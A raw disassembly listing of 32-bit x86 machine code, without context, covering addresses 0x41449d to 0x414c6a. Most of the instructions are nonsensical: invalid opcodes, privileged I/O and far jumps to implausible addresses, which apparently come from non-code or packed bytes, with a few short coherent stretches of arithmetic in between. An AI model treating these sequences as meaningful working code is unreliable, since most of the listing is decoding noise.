  41449d:	jbe    0x414459
  41449f:	pop    eax
  4144a0:	test   al,0xf7
  4144a2:	fdivr  st(4),st
  4144a4:	pop    esp
  4144a5:	add    BYTE PTR [ebx+0x8efe4b4],bl
  4144ab:	sbb    al,0xf7
  4144ad:	sbb    esi,DWORD PTR [ecx+0xb1c9d40]
  4144b3:	cmp    al,cl
  4144b5:	loop   0x41444f
  4144b7:	inc    ebx
  4144b8:	jne    0x414503
  4144ba:	sbb    ebx,DWORD PTR [eax+0x5013a660]
  4144c0:	xor    al,BYTE PTR ds:0x2711da06
  4144c6:	cld    
  4144c7:	sub    ch,BYTE PTR [eax+0xf]
  4144ca:	pop    ebp
  4144cb:	push   ds
  4144cc:	aas    
  4144cd:	xlat   BYTE PTR ds:[ebx]
  4144ce:	clc    
  4144cf:	leave  
  4144d0:	out    dx,al
  4144d1:	addr16 add al,0xb1
  4144d4:	out    0x4c,eax
  4144d6:	fucomip st,st(7)
  4144d8:	push   cs
  4144d9:	mov    ebp,DWORD PTR [eax-0x76587928]
  4144df:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4144e0:	pop    edx
  4144e1:	in     al,dx
  4144e2:	or     eax,ebx
  4144e4:	dec    esp
  4144e5:	mov    ch,0x3d
  4144e7:	sbb    esp,DWORD PTR [edi]
  4144e9:	jmp    0x4144b3
  4144eb:	cli    
  4144ec:	aaa    
  4144ed:	cmp    esi,DWORD PTR [ebp+0x73]
  4144f0:	mov    ecx,ecx
  4144f2:	mov    DWORD PTR [ebx-0x16],esp
  4144f5:	js     0x4144ba
  4144f7:	or     al,0xab
  4144f9:	jg     0x414535
  4144fb:	jmp    0xdcaf6a6d
  414500:	mov    DWORD PTR [ebp-0x6e8acf8e],esi
  414506:	call   0x14215656
  41450b:	cmp    dh,bl
  41450d:	cmp    cl,0x48
  414510:	je     0x4144e5
  414512:	sub    eax,0xacd5a283
  414517:	pop    edi
  414518:	mov    bl,0xcb
  41451a:	inc    eax
  41451b:	push   esi
  41451c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41451d:	enter  0x7cb3,0xfb
  414521:	retf   0x553e
  414524:	sub    edx,ecx
  414526:	and    eax,0x24e2c54b
  41452b:	push   ebx
  41452c:	ret    
  41452d:	leave  
  41452e:	mov    al,ds:0xbf3f687b
  414533:	dec    eax
  414534:	xor    ecx,eax
  414536:	mov    dl,0x5e
  414538:	js     0x414513
  41453a:	(bad)  
  41453b:	outs   dx,DWORD PTR ds:[esi]
  41453c:	imul   ecx,DWORD PTR [eax-0x58a06a6e],0xec954778
  414546:	push   eax
  414547:	adc    BYTE PTR [esi],ch
  414549:	pushf  
  41454a:	jnp    0x41458c
  41454c:	pop    eax
  41454d:	inc    ebx
  41454e:	mov    esp,DWORD PTR [eax-0x19]
  414551:	add    al,0xbe
  414553:	pop    edx
  414554:	jnp    0x414591
  414556:	loopne 0x414559
  414558:	(bad)  
  414559:	xor    dh,BYTE PTR [ebx+edi*1]
  41455c:	fldenv [edx-0xfa2940f]
  414562:	dec    ecx
  414563:	int    0xdc
  414565:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414566:	mov    edx,0x8d697b2b
  41456b:	or     BYTE PTR [edx+0x11223f58],bh
  414571:	enter  0x4422,0x8e
  414575:	stos   DWORD PTR es:[edi],eax
  414576:	pop    eax
  414577:	ss mov esi,0x7f292c49
  41457d:	inc    esp
  41457e:	fcomp  QWORD PTR [ebx]
  414580:	add    eax,0x257feb7a
  414585:	jge    0x4145fc
  414587:	mov    WORD PTR [ecx],?
  414589:	mov    al,ds:0xd7af9fa7
  41458e:	inc    esp
  41458f:	arpl   WORD PTR [ecx],sp
  414591:	jo     0x41454a
  414593:	xchg   ecx,eax
  414594:	jne    0x4145b0
  414596:	inc    esp
  414597:	call   0xd0bd:0x1c63f04f
  41459e:	clc    
  41459f:	mov    ebx,0x27fc2152
  4145a4:	aad    0x9e
  4145a6:	xor    eax,0xd0476370
  4145ab:	fwait
  4145ac:	or     al,0x14
  4145ae:	xor    eax,DWORD PTR [ecx+eax*1]
  4145b1:	push   esi
  4145b2:	sub    ebp,esp
  4145b4:	mov    esi,0x4d09f250
  4145b9:	xor    al,0xcd
  4145bb:	or     DWORD PTR [ebp+esi*1-0x8],eax
  4145bf:	mov    edi,0x48891db1
  4145c4:	pop    ds
  4145c5:	mov    edi,0x69771711
  4145ca:	fwait
  4145cb:	hlt    
  4145cc:	sti    
  4145cd:	cdq    
  4145ce:	adc    al,0xfd
  4145d0:	mov    ch,0xe3
  4145d2:	out    dx,al
  4145d3:	sbb    DWORD PTR [edi+0x5fbaa22b],esi
  4145d9:	mov    ch,0x33
  4145db:	retf   
  4145dc:	retf   
  4145dd:	cmp    dl,al
  4145df:	xchg   ebp,eax
  4145e0:	(bad)  
  4145e1:	mov    edi,0xa046fe76
  4145e6:	mov    ah,dh
  4145e8:	mov    ?,edx
  4145ea:	sbb    BYTE PTR [ebp+0x2662fc69],0x6f
  4145f1:	popa   
  4145f2:	aaa    
  4145f3:	call   0xdbf46980
  4145f8:	(bad)  
  4145f9:	mov    esp,0x6fb976d1
  4145fe:	add    dl,BYTE PTR [ebp-0x3b6dbe23]
  414604:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414605:	pop    ecx
  414606:	out    0x27,al
  414608:	sub    BYTE PTR [ecx+0x62445200],ch
  41460e:	gs pop edi
  414610:	jnp    0x414632
  414612:	(bad)  
  414613:	cmp    edx,ecx
  414615:	popf   
  414616:	mov    esi,0x970082c0
  41461b:	adc    bh,ah
  41461d:	adc    cl,cl
  41461f:	jnp    0x414600
  414621:	cmp    bh,BYTE PTR [ebp*4-0x6ac22fe1]
  414628:	and    al,0x48
  41462a:	sub    bl,BYTE PTR [eax-0x7eda452b]
  414630:	dec    esi
  414631:	mov    cl,dl
  414633:	(bad)  
  414634:	jmp    0x414668
  414636:	xchg   DWORD PTR [ecx+eax*4],eax
  414639:	mov    esp,0x769d2ea1
  41463e:	repnz fadd DWORD PTR [ebx+0x28847bbb]
  414645:	gs mov ecx,0x80fa7574
  41464b:	(bad)  {k7}
  414650:	mov    esp,0x45951f88
  414655:	mov    dl,ch
  414657:	sbb    eax,0xfd32306
  41465c:	scas   eax,DWORD PTR es:[edi]
  41465d:	xlat   BYTE PTR ds:[ebx]
  41465e:	mov    edi,DWORD PTR [ebp-0x18]
  414661:	jmp    0x4148e9
  414666:	retf   
  414667:	ret    0xd23d
  41466a:	vpand  xmm3,xmm5,xmm1
  41466e:	ret    0xb492
  414671:	sub    BYTE PTR [edx-0x2b],0x53
  414675:	shr    DWORD PTR [esi-0x1a8780f1],0x7e
  41467c:	js     0x4146f6
  41467e:	push   eax
  41467f:	sti    
  414680:	push   esp
  414681:	ficom  WORD PTR [ebp+0x32]
  414684:	mov    ebx,0x71388185
  414689:	ret    
  41468a:	mov    bh,0xf3
  41468c:	jp     0x414622
  41468e:	mov    eax,ds:0xa497f9b6
  414693:	das    
  414694:	xchg   edi,eax
  414695:	mov    gs,WORD PTR [edi+0x38]
  414698:	push   cs
  414699:	in     al,0x2d
  41469b:	loopne 0x414653
  41469d:	xor    ebp,edi
  41469f:	jns    0x414647
  4146a1:	sbb    al,0x32
  4146a3:	xchg   ecx,eax
  4146a4:	dec    ecx
  4146a5:	shr    DWORD PTR [edx+edi*2+0x16bb5d58],0xc9
  4146ad:	mov    ah,BYTE PTR [ebp+ebp*1+0x1a5128ef]
  4146b4:	fwait
  4146b5:	push   ss
  4146b6:	adc    cl,ah
  4146b8:	pop    edx
  4146b9:	cmc    
  4146ba:	xlat   BYTE PTR ds:[ebx]
  4146bb:	ficom  DWORD PTR [ebp-0x37a5f08e]
  4146c1:	cld    
  4146c2:	pop    edx
  4146c3:	or     al,0x8e
  4146c5:	aad    0xec
  4146c7:	outs   dx,DWORD PTR ds:[esi]
  4146c8:	cmc    
  4146c9:	sub    eax,eax
  4146cb:	dec    esi
  4146cc:	mov    gs,WORD PTR [ecx+0x37f76193]
  4146d2:	adc    esi,DWORD PTR [esi-0x782dd7a3]
  4146d8:	add    bl,BYTE PTR [ebx]
  4146da:	popf   
  4146db:	lds    ecx,FWORD PTR [ebp+0x333cd287]
  4146e1:	in     eax,dx
  4146e2:	cmp    ebx,ebx
  4146e4:	outs   dx,DWORD PTR ds:[esi]
  4146e5:	jp     0x4146b4
  4146e7:	das    
  4146e8:	in     al,0xa4
  4146ea:	lods   al,BYTE PTR ds:[esi]
  4146eb:	into   
  4146ec:	pop    esp
  4146ed:	sahf   
  4146ee:	clc    
  4146ef:	mov    edx,0xb279a248
  4146f4:	stc    
  4146f5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4146f6:	mov    ecx,0xfd54120d
  4146fb:	push   edi
  4146fc:	jae    0x41474e
  4146fe:	cmp    dl,al
  414700:	mov    ch,0xec
  414702:	pop    edi
  414703:	inc    esp
  414704:	xchg   edi,eax
  414705:	fcmove st,st(4)
  414707:	out    dx,eax
  414708:	inc    esp
  414709:	fstp   QWORD PTR [edx]
  41470b:	add    al,0xe
  41470d:	xchg   esi,eax
  41470e:	sbb    al,0xab
  414710:	xchg   DWORD PTR [ecx],esp
  414712:	jl     0x414755
  414714:	popa   
  414715:	imul   ecx,DWORD PTR [edi+0x0],0x6
  414719:	enter  0xd75d,0x7
  41471d:	jb     0x414760
  41471f:	ja     0x4146f2
  414721:	dec    edi
  414722:	popa   
  414723:	jbe    0x41472c
  414725:	(bad)  
  414726:	sahf   
  414727:	mov    ch,0x20
  414729:	mov    ah,BYTE PTR ds:0xf2c51663
  41472f:	mov    edx,0x87eeed9b
  414734:	push   edi
  414735:	ret    0xf56e
  414738:	or     BYTE PTR [ebp-0x21],bl
  41473b:	iret   
  41473c:	dec    edi
  41473d:	cs dec ecx
  41473f:	fisubr WORD PTR [ecx+0x53]
  414742:	jmp    0x41472b
  414744:	icebp  
  414745:	pop    ebp
  414746:	call   0x83d0:0x88c5ddfe
  41474d:	lock mov ecx,0x7b5c1a38
  414753:	mov    al,ds:0x45eecd61
  414758:	test   al,0x5a
  41475a:	shl    bl,1
  41475c:	pop    ss
  41475d:	jae    0x414738
  41475f:	test   cl,dl
  414761:	out    0x10,al
  414763:	aaa    
  414764:	xor    eax,0x4abae93c
  414769:	xor    al,0x8e
  41476b:	outs   dx,BYTE PTR ds:[esi]
  41476c:	xor    DWORD PTR [eax+0x24],esp
  41476f:	bnd jb 0x41476d
  414772:	outs   dx,DWORD PTR ds:[esi]
  414773:	add    eax,esi
  414775:	test   BYTE PTR [edi-0x6ad493ee],0xdc
  41477c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41477d:	(bad)  
  41477e:	in     eax,0x54
  414780:	mov    dh,0x9
  414782:	icebp  
  414783:	adc    eax,0xdf32d3fd
  414788:	lods   eax,DWORD PTR ds:[esi]
  414789:	(bad)  [edx]
  41478b:	xchg   BYTE PTR [ebx+0x31],ah
  41478e:	pop    edx
  41478f:	out    0x9,eax
  414791:	push   ds
  414792:	daa    
  414793:	lds    esi,FWORD PTR cs:[edi]
  414796:	cmp    DWORD PTR [ebx+ebp*2+0x17],eax
  41479a:	push   ds
  41479b:	fdivr  st,st(0)
  41479d:	mov    DWORD PTR [ebp-0x2092c903],ebx
  4147a3:	pop    esi
  4147a4:	in     eax,dx
  4147a5:	jo     0x4147d4
  4147a7:	iret   
  4147a8:	dec    eax
  4147a9:	mov    dh,0x26
  4147ab:	mov    WORD PTR [esi-0x5a],ss
  4147ae:	pop    eax
  4147af:	out    dx,al
  4147b0:	sahf   
  4147b1:	bound  ebx,QWORD PTR [edx+0x616813fa]
  4147b7:	mov    ecx,0x5aaa5c20
  4147bc:	jbe    0x414767
  4147be:	icebp  
  4147bf:	push   edi
  4147c0:	rol    DWORD PTR [edx-0x5b],1
  4147c3:	loope  0x414774
  4147c5:	sub    al,0x13
  4147c7:	(bad)  
  4147c8:	pop    ds
  4147c9:	call   0xefc5d927
  4147ce:	jge    0x41479b
  4147d0:	test   al,0x43
  4147d2:	inc    ebx
  4147d3:	mov    ebp,0x50f0e54d
  4147d8:	lods   al,BYTE PTR ds:[esi]
  4147d9:	loope  0x414764
  4147db:	sub    bh,al
  4147dd:	out    0x48,al
  4147df:	test   eax,0x66247234
  4147e4:	sbb    ch,BYTE PTR [ebx+0x2a4b0c46]
  4147ea:	clc    
  4147eb:	daa    
  4147ec:	fcomp  DWORD PTR [edx-0x69]
  4147ef:	dec    ebx
  4147f0:	fdivr  QWORD PTR [ebx]
  4147f2:	test   al,0xd8
  4147f4:	xchg   DWORD PTR [ebp+0x793718f9],eax
  4147fa:	jle    0x4147b2
  4147fc:	inc    ecx
  4147fd:	jo     0x414844
  4147ff:	mov    al,0x92
  414801:	sub    esi,edi
  414803:	ja     0x414875
  414805:	dec    edi
  414806:	jne    0x414849
  414808:	cmp    esp,DWORD PTR [ecx+0x5f]
  41480b:	push   esp
  41480c:	arpl   WORD PTR [esi-0x45],ax
  41480f:	in     al,0x9d
  414811:	(bad)  
  414812:	(bad)  
  414813:	ja     0x41486e
  414815:	retf   0x8c55
  414818:	aad    0xc8
  41481a:	shl    DWORD PTR [edi+0x6],cl
  41481d:	out    0x87,eax
  41481f:	push   esp
  414820:	mov    ebx,DWORD PTR [edi]
  414822:	xor    BYTE PTR [edx-0x5686aa7a],dh
  414828:	inc    edx
  414829:	adc    eax,ebx
  41482b:	mov    bl,0x38
  41482d:	xchg   edx,eax
  41482e:	int3   
  41482f:	pop    es
  414830:	mov    ebp,0x83bf6086
  414835:	and    ah,ah
  414837:	test   al,0x77
  414839:	aam    0x7a
  41483b:	pop    ebp
  41483c:	jb     0x414889
  41483e:	lahf   
  41483f:	ins    BYTE PTR es:[edi],dx
  414840:	push   cs
  414841:	mov    bl,0xb4
  414843:	(bad)  
  414844:	mov    al,0x36
  414846:	lods   eax,DWORD PTR ds:[esi]
  414847:	push   cs
  414848:	jae    0x414875
  41484a:	mov    al,0xac
  41484c:	xchg   ah,bh
  41484e:	add    al,0x24
  414850:	fstp   st(7)
  414852:	jge    0x4147f1
  414854:	inc    cx
  414856:	js     0x414850
  414858:	jns    0x414838
  41485a:	(bad)  
  41485b:	aad    0xaa
  41485d:	(bad)  
  41485e:	cmp    dl,bh
  414860:	xor    al,0x8a
  414862:	inc    esp
  414863:	sbb    eax,0xe9a3a35f
  414868:	retf   0x5ab1
  41486b:	imul   esp,DWORD PTR ds:0xecb91b54,0x24d097f5
  414875:	cwde   
  414876:	popa   
  414877:	xchg   BYTE PTR cs:[eax-0x2a50a8d],bl
  41487e:	mov    edi,0x7aab057a
  414883:	out    0x96,eax
  414885:	test   al,0x2f
  414887:	ins    DWORD PTR es:[edi],dx
  414888:	(bad)  
  414889:	in     eax,0x6e
  41488b:	loope  0x414814
  41488d:	push   ebp
  41488e:	pop    ss
  41488f:	pop    es
  414890:	sub    ch,cl
  414892:	and    dh,BYTE PTR ds:0xec607716
  414898:	cmp    eax,0x971e43c6
  41489d:	mov    ah,0x84
  41489f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4148a0:	xchg   esp,eax
  4148a1:	into   
  4148a2:	push   ds
  4148a3:	push   0xffffffa7
  4148a5:	mov    ah,0x1e
  4148a7:	push   0x5c2e3854
  4148ac:	into   
  4148ad:	imul   BYTE PTR [esi]
  4148af:	lock or al,0x90
  4148b2:	inc    edi
  4148b3:	xchg   edx,eax
  4148b4:	or     al,0xee
  4148b6:	push   edi
  4148b7:	ds inc esi
  4148b9:	add    eax,0x2dc93154
  4148be:	cmp    ebx,esp
  4148c0:	mov    dh,0x52
  4148c2:	push   ds
  4148c3:	add    ah,BYTE PTR [ebx+0x6]
  4148c6:	sub    al,0xb0
  4148c8:	cmp    eax,0xefdb4846
  4148cd:	inc    edx
  4148ce:	mov    ebp,0xf9c10f1a
  4148d3:	fstp   DWORD PTR [ebp+0xd]
  4148d6:	iret   
  4148d7:	test   ecx,eax
  4148d9:	add    eax,0xf2477462
  4148de:	out    dx,al
  4148df:	(bad)  
  4148e0:	sbb    al,0x45
  4148e2:	inc    esi
  4148e3:	push   ds
  4148e4:	mov    es,edx
  4148e6:	mov    esi,0xf83330c6
  4148eb:	add    edx,edi
  4148ed:	mov    edi,DWORD PTR [ebp-0x8]
  4148f0:	lea    edx,[edx+edi*1+0x327298]
  4148f7:	mov    DWORD PTR [ebp-0x8],edx
  4148fa:	mov    edx,DWORD PTR [ebp-0x20]
  4148fd:	xor    edx,eax
  4148ff:	mov    edi,0xffcd8d68
  414904:	sub    edi,edx
  414906:	add    edi,DWORD PTR [ebp-0x10]
  414909:	mov    edx,DWORD PTR [ebp-0x20]
  41490c:	mov    ebx,DWORD PTR [ebp-0x8]
  41490f:	jmp    0x414b97
  414914:	rcl    bh,0xc5
  414917:	(bad)  
  414918:	aad    0xda
  41491a:	leave  
  41491b:	(bad)  [eax+0x2127854b]
  414921:	fucom  st(6)
  414923:	stos   BYTE PTR es:[edi],al
  414924:	sbb    ecx,DWORD PTR [edi+edi*2]
  414927:	js     0x41490e
  414929:	jle    0x4149a3
  41492b:	js     0x4148b8
  41492d:	bound  ebp,QWORD PTR [edx]
  41492f:	xor    ch,ah
  414931:	js     0x41491b
  414933:	mov    edi,0x554d81e1
  414938:	loop   0x4149b5
  41493a:	in     al,dx
  41493b:	pop    ebx
  41493c:	mov    al,BYTE PTR ds:0xcb01b937
  414942:	icebp  
  414943:	pop    ecx
  414944:	fimul  WORD PTR [ecx-0x69]
  414947:	test   al,0x36
  414949:	test   al,0x17
  41494b:	out    dx,al
  41494c:	aad    0x9b
  41494e:	jb     0x414983
  414950:	jo     0x4149b7
  414952:	mov    ds:0x5e8ec4e0,eax
  414957:	je     0x4149a5
  414959:	jl     0x4149d1
  41495b:	stos   BYTE PTR es:[edi],al
  41495c:	push   ebx
  41495d:	retf   
  41495e:	stos   DWORD PTR es:[edi],eax
  41495f:	add    al,0x3
  414961:	or     BYTE PTR [edi-0x57],dl
  414964:	les    ebp,FWORD PTR [ebp+0x6e5f7880]
  41496a:	mov    esi,0xf4358ca2
  41496f:	or     dl,BYTE PTR [ebp-0x75747461]
  414975:	mov    ah,0x16
  414977:	xlat   BYTE PTR ds:[ebx]
  414978:	imul   edx,DWORD PTR [esi+eiz*1-0x5e2d10f7],0xfffffffb
  414980:	jo     0x414964
  414982:	call   0xf7d:0x9b080db9
  414989:	call   0x9d763e6e
  41498e:	cmc    
  41498f:	sahf   
  414990:	jbe    0x414942
  414992:	nop
  414993:	xor    bh,BYTE PTR [ecx-0x5d226dce]
  414999:	vorps  ymm0,ymm1,YMMWORD PTR [ecx-0x22]
  41499e:	pop    ebp
  41499f:	out    0xf1,al
  4149a1:	dec    ecx
  4149a2:	pop    ecx
  4149a3:	and    ebx,ebx
  4149a5:	mov    eax,ds:0x4c7e0d2d
  4149aa:	fcmovb st,st(6)
  4149ac:	inc    ebp
  4149ad:	in     eax,0x7f
  4149af:	repz in eax,0xef
  4149b2:	rcl    DWORD PTR [ecx],0xa4
  4149b5:	loop   0x414a29
  4149b7:	jns    0x4149f1
  4149b9:	pop    ss
  4149ba:	and    esi,DWORD PTR ds:0x3c04d224
  4149c0:	jl     0x414970
  4149c2:	std    
  4149c3:	xchg   ebx,edi
  4149c5:	inc    ecx
  4149c6:	push   ecx
  4149c7:	gs retf 0xb0cd
  4149cb:	neg    ebx
  4149cd:	cdq    
  4149ce:	jo     0x414a3e
  4149d0:	sub    esi,DWORD PTR [ebp+0x5bc3eb88]
  4149d6:	ins    BYTE PTR es:[edi],dx
  4149d7:	int    0x88
  4149d9:	pop    ebp
  4149da:	xchg   esi,eax
  4149db:	test   al,0xb2
  4149dd:	sar    esp,cl
  4149df:	inc    edx
  4149e0:	inc    ebp
  4149e1:	jecxz  0x414a04
  4149e3:	sbb    al,0xd4
  4149e5:	add    BYTE PTR [ebx-0x15],cl
  4149e8:	xchg   ebx,eax
  4149e9:	sub    ebp,DWORD PTR [edi-0x674117c5]
  4149ef:	in     al,dx
  4149f0:	adc    edi,DWORD PTR [ebp-0x7044b0f8]
  4149f6:	xor    esp,DWORD PTR [edi-0x21]
  4149f9:	stos   DWORD PTR es:[edi],eax
  4149fa:	pushf  
  4149fb:	ror    DWORD PTR [edi+ebx*2-0x5e715d6f],cl
  414a02:	test   al,0xc5
  414a04:	mov    WORD PTR [ebp-0x1290ca7d],?
  414a0a:	xchg   DWORD PTR [eax-0x42],ebx
  414a0d:	addr16 retf 0x5fd7
  414a11:	idiv   DWORD PTR [esi]
  414a13:	push   edi
  414a14:	mov    dh,0xb
  414a16:	mov    ds:0x77fd3196,eax
  414a1b:	sbb    eax,0x73eb2bb2
  414a20:	arpl   WORD PTR [edx-0x443d69f8],sp
  414a26:	sbb    edi,ebp
  414a28:	cld    
  414a29:	jp     0x4149ed
  414a2b:	(bad)  
  414a2c:	in     al,dx
  414a2d:	dec    ebp
  414a2e:	les    edi,FWORD PTR [ecx-0x59d44cbf]
  414a34:	and    al,0xd5
  414a36:	inc    BYTE PTR [ebx]
  414a38:	adc    al,0xb5
  414a3a:	or     eax,DWORD PTR [edx]
  414a3c:	xchg   esi,eax
  414a3d:	jae    0x414ab1
  414a3f:	or     dh,BYTE PTR [esi]
  414a41:	fwait
  414a42:	add    cl,BYTE PTR [esi]
  414a44:	mov    ds:0xd471f74e,eax
  414a49:	sub    ah,BYTE PTR [edi+edx*4+0x2a]
  414a4d:	loope  0x414a06
  414a4f:	xchg   esp,eax
  414a50:	push   eax
  414a51:	int    0xb7
  414a53:	pop    edx
  414a54:	xlat   BYTE PTR ds:[ebx]
  414a55:	pusha  
  414a56:	sbb    bl,dl
  414a58:	push   edx
  414a59:	and    BYTE PTR [edi],ch
  414a5b:	xchg   esi,eax
  414a5c:	cmp    BYTE PTR [eax],0xc6
  414a5f:	sbb    dl,dl
  414a61:	pushf  
  414a62:	nop
  414a63:	adc    esp,ebx
  414a65:	xchg   edx,ecx
  414a67:	fst    QWORD PTR [esi+0xc]
  414a6a:	adc    al,0x54
  414a6c:	lahf   
  414a6d:	cdq    
  414a6e:	in     al,0xbd
  414a70:	retf   0x833e
  414a73:	hlt    
  414a74:	in     eax,0x31
  414a76:	loop   0x414a00
  414a78:	and    eax,0xf027dfe6
  414a7d:	out    0x3c,eax
  414a7f:	push   esi
  414a80:	call   0x63b3:0x3f461026
  414a87:	sbb    DWORD PTR [esi+0x61],0xd06b4a15
  414a8e:	add    al,0x2d
  414a90:	mov    al,ds:0x3909388
  414a95:	pop    eax
  414a96:	dec    edi
  414a97:	fnstenv [ebx]
  414a99:	inc    esi
  414a9a:	(bad)  
  414a9b:	shr    BYTE PTR [ecx],1
  414a9d:	xor    DWORD PTR [ebx],0xffffff89
  414aa0:	ficomp WORD PTR [edi]
  414aa2:	(bad)  
  414aa4:	cmp    bl,0xf9
  414aa7:	mov    WORD PTR [eax],ds
  414aa9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414aaa:	cli    
  414aab:	mov    eax,ds:0x36ffa84d
  414ab0:	fadd   QWORD PTR [esi+0x51641347]
  414ab6:	sub    ch,BYTE PTR [ecx]
  414ab8:	mov    eax,ds:0xbd93e579
  414abd:	jmp    0xb7f2:0x72f3abc1
  414ac4:	jno    0x414b1b
  414ac6:	cmp    BYTE PTR [ebx-0x6a5cce09],bl
  414acc:	jns    0x414a60
  414ace:	aaa    
  414acf:	push   edi
  414ad0:	hlt    
  414ad1:	jg     0x414b35
  414ad3:	aas    
  414ad4:	inc    edx
  414ad5:	mov    ds:0xe2e248f7,eax
  414ada:	in     eax,0xc3
  414adc:	jbe    0x414a99
  414ade:	lds    eax,FWORD PTR [ecx]
  414ae0:	sbb    eax,0xbe6c28fe
  414ae5:	imul   edi,DWORD PTR [esi+0xcf87400],0xe7936fa8
  414aef:	jbe    0x414a74
  414af1:	or     al,0x7f
  414af3:	test   eax,0x7e608c55
  414af8:	pop    ecx
  414af9:	pop    esp
  414afa:	ins    BYTE PTR es:[edi],dx
  414afb:	enter  0x4cd0,0x71
  414aff:	cld    
  414b00:	jp     0x414ade
  414b02:	ss ss data16 or al,0x4c
  414b07:	cmc    
  414b08:	not    BYTE PTR es:[edi+0x6d]
  414b0c:	jns    0x414ab4
  414b0e:	imul   esp,DWORD PTR [ebp+0x708ab91b],0x3e
  414b15:	add    eax,0x6306fcc8
  414b1a:	jbe    0x414b3a
  414b1c:	aas    
  414b1d:	jg     0x414b0e
  414b1f:	outs   dx,BYTE PTR ds:[esi]
  414b20:	xor    al,0xdd
  414b22:	inc    ebp
  414b23:	inc    eax
  414b24:	sub    al,0xea
  414b26:	fucomp st(3)
  414b28:	lods   eax,DWORD PTR ds:[esi]
  414b29:	leave  
  414b2a:	xor    BYTE PTR [edi+0x73bbfd3c],ah
  414b30:	xor    edi,DWORD PTR [ecx-0x75]
  414b33:	pusha  
  414b34:	out    dx,eax
  414b35:	jl     0x414b3f
  414b37:	and    BYTE PTR [esp+esi*2],bh
  414b3a:	(bad)
  414b3d:	push   0xa681f884
  414b42:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414b43:	pop    ds
  414b44:	mov    ds:0xaea1ed43,eax
  414b49:	iret   
  414b4a:	(bad)  [edi+0x2b680d8b]
  414b50:	outs   dx,BYTE PTR ds:[esi]
  414b51:	dec    edx
  414b52:	pop    esp
  414b53:	gs std 
  414b55:	pop    edx
  414b56:	xchg   ebp,eax
  414b57:	dec    ebx
  414b58:	mov    ecx,0xb96e29ce
  414b5d:	xchg   ebx,eax
  414b5e:	dec    eax
  414b5f:	adc    esi,DWORD PTR [esi-0x2a]
  414b62:	sub    esi,ebx
  414b64:	ret    
  414b65:	adc    DWORD PTR [ebx-0x1c4a359c],ebx
  414b6b:	mov    ch,0x6b
  414b6d:	in     al,dx
  414b6e:	retf   
  414b6f:	nop
  414b70:	icebp  
  414b71:	push   esp
  414b72:	ret    0xa9b5
  414b75:	outs   dx,DWORD PTR ds:[esi]
  414b76:	mov    ?,WORD PTR [edx-0x40]
  414b79:	adc    ebp,DWORD PTR [edi-0x33]
  414b7c:	jmp    0xca6e6c9a
  414b81:	test   DWORD PTR [edx+0x12],ecx
  414b84:	xchg   esp,eax
  414b85:	jp     0x414b3e
  414b87:	out    0xc7,eax
  414b89:	mov    ebp,0xe4a7801c
  414b8e:	iret   
  414b8f:	mov    edx,0x436617ba
  414b94:	js     0x414ba1
  414b96:	repz xor edx,eax
  414b99:	add    edx,ecx
  414b9b:	imul   edx,ebx
  414b9e:	cmp    edx,edi
  414ba0:	jmp    0x414e28
  414ba5:	int    0xc1
  414ba7:	cmp    al,0xca
  414ba9:	int3   
  414baa:	leave  
  414bab:	aad    0xd9
  414bad:	xchg   esp,eax
  414bae:	mov    ch,0x6d
  414bb0:	dec    edx
  414bb1:	xchg   edx,eax
  414bb2:	call   FWORD PTR [ebp+0x7f1280cb]
  414bb8:	js     0x414b9f
  414bba:	jle    0x414c34
  414bbc:	js     0x414c1d
  414bbe:	test   DWORD PTR ds:0xdb25b007,ebp
  414bc4:	ins    DWORD PTR es:[edi],dx
  414bc5:	and    eax,0x7ae472d5
  414bca:	test   BYTE PTR [ecx+0x78],0x35
  414bce:	mov    ah,0xfd
  414bd0:	fcom   st(4)
  414bd2:	dec    edx
  414bd3:	and    bl,bl
  414bd5:	mov    ds:0x9483f659,eax
  414bda:	ss std 
  414bdc:	neg    esi
  414bde:	push   edi
  414bdf:	daa    
  414be0:	add    eax,0x9dde6fba
  414be5:	xchg   edx,eax
  414be6:	sub    esp,DWORD PTR [edx-0x5d]
  414be9:	in     eax,dx
  414bea:	adc    ebx,ebx
  414bec:	and    bl,0xe9
  414bef:	imul   ebx,DWORD PTR [edi],0xffffff9a
  414bf2:	in     al,dx
  414bf3:	sub    eax,0x46e515ab
  414bf8:	sub    eax,0x8bdba526
  414bfd:	cmp    BYTE PTR [edx-0x7533bd0d],cl
  414c03:	(bad)  
  414c04:	repz mov WORD PTR ds:0xb3a2634f,es
  414c0b:	(bad)  
  414c0c:	pop    esi
  414c0d:	out    dx,eax
  414c0e:	rol    DWORD PTR fs:[ebx],cl
  414c11:	frstor [edi-0x57]
  414c14:	jge    0x414c92
  414c16:	xor    cl,BYTE PTR [ebx-0x1f]
  414c19:	sbb    ch,bh
  414c1b:	and    ch,0x2e
  414c1e:	(bad)  
  414c1f:	repz loop 0x414bd8
  414c22:	sub    DWORD PTR [ebx],eax
  414c24:	(bad)  
  414c25:	test   BYTE PTR [ebx],bl
  414c27:	jno    0x414c7a
  414c29:	je     0x414c87
  414c2b:	add    dl,BYTE PTR [edx+edx*8-0x48]
  414c2f:	sbb    dl,dh
  414c31:	test   al,0x15
  414c33:	les    esp,FWORD PTR [ecx+0x17]
  414c36:	call   0x79d8:0x7052498
  414c3d:	cmc    
  414c3e:	in     eax,0x30
  414c40:	cld    
  414c41:	jmp    DWORD PTR [esi]
  414c43:	repz mov dl,0xe
  414c46:	lods   eax,DWORD PTR ds:[esi]
  414c47:	scas   al,BYTE PTR es:[edi]
  414c48:	mul    BYTE PTR [eax]
  414c4a:	into   
  414c4b:	in     al,0x12
  414c4d:	cld    
  414c4e:	nop
  414c4f:	mov    bh,0x71
  414c51:	outs   dx,BYTE PTR ds:[esi]
  414c52:	mov    ch,0xb4
  414c54:	lods   eax,DWORD PTR ds:[esi]
  414c55:	(bad)  
  414c56:	xor    ah,ch
  414c58:	mov    al,ds:0xb90b368
  414c5d:	mov    eax,ds:0x121d8428
  414c62:	iret   
  414c63:	hlt    
  414c64:	add    eax,DWORD PTR [edi]
  414c66:	clc    
  414c67:	(bad)  
  414c68:	jb     0x414c16
  414c6a:	pop    es
